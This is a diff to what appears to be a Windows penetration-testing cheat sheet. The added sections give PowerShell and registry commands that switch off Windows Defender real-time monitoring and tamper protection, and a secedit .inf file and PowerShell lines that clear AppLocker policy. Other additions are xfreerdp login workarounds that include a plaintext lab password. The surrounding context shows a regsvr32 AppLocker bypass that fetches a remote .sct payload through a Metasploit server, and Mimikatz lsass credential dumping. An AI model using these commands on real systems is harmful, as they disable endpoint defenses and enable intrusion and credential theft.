@@ -369,9 +369,26 @@ Impersonated user is: NT AUTHORITY\SYSTEM.
 Executed '"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All' with impersonated token!
 ```
 
-## disable av
+## disable AV
+see also: https://github.com/swagkarna/Defeat-Defender-V1.2.0
+see also: https://github.com/jeremybeaume/tools/blob/master/disable-defender.ps1
+see also: https://theitbros.com/managing-windows-defender-using-powershell/
 ```powershell
+# you may need to disable tamper protection first
 Set-MpPreference -DisableRealtimeMonitoring $true
+
+# confirm that it works: output should be True
+Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring
+```
+
+```
+# if you need to disable tamper protection in order to disable AV you need to be SYSTEM or NT Service\TrustedInstaller
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name TamperProtection -Value 4
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name TamperProtectionSource -Value 2
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name SenseDevMode -Value 0
+
+# confirm tamper protection state
+Get-MpComputerStatus | select IsTamperProtected
 ```
 
 # applocker bypass
@@ -484,6 +501,34 @@ regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
 
 # host file.sct via metasploit
 use auxiliary/server/regsvr32_command_delivery_server
+```
+
+## disable applocker
+- via GUI
+```
+gpedit.msc > Computer Configuration > Windows Settings > Security Settings > Application Control Policies > AppLocker
+```
+- via CMD: create a file disable_applocker.inf
+```
+[Version]
+Signature="$WINDOWS NT$"
+
+[Unicode]
+Unicode=yes
+
+[RegistryValues]
+; Delete AppLocker GPO settings
+HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2 /f
+```
+
+```
+secedit /configure /db %windir%\security\local.sdb /cfg path\to\disable_applocker.inf /areas SECURITYPOLICY
+```
+- via PowerShell
+```
+# open powershell as administrator
+Get-AppLockerPolicy -Effective | Set-AppLockerPolicy -RuleType None
+Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process
 ```
 
 # bypass network filters
@@ -756,7 +801,7 @@ runas /user:corp1.com\jeff powershell
 
 # import and get local admin creds this time
 Import-Module .\LAPSToolkit.ps1
-LAPSComputers
+Get-LAPSComputers
 ```
 
 ## access tokens (printspoofer)
@@ -889,6 +934,22 @@ Invoke-Mimikatz -Command "`"sekurlsa::minidump c:\windows\tasks\lsass.dmp`" seku
 ```
 
 # windows lateral movement
+
+## RDP troubleshooting
+sometimes xfreerdp will not let you rdp even though you have the correct password, this is because it doesn't read in special characters properly
+```
+...nla_recv_pdu:freerdp_set_last_error_ex ERRCONNECT_LOGON_FAILURE...
+
+# workaround 1: /sec:tls
+xfreerdp /u:Administrator /p:'m31R}dd7rX]@7G' /v:192.168.153.122 /p:lab /timeout:50000 +auto-reconnect /auto-reconnect-max-retries:0 /sec:tls
+
+# workaround 2: -sec-nla
+xfreerdp /u:Administrator /p:'m31R}dd7rX]@7G' /v:192.168.153.122 /p:lab /timeout:50000 +auto-reconnect /auto-reconnect-max-retries:0 -sec-nla
+
+# both workarounds require to retype the password in the GUI
+# alternative 1: install reminna
+# alternative 2: try rdesktop
+```
 
 ## RDP with DisableRestrictedAdmin
 ```
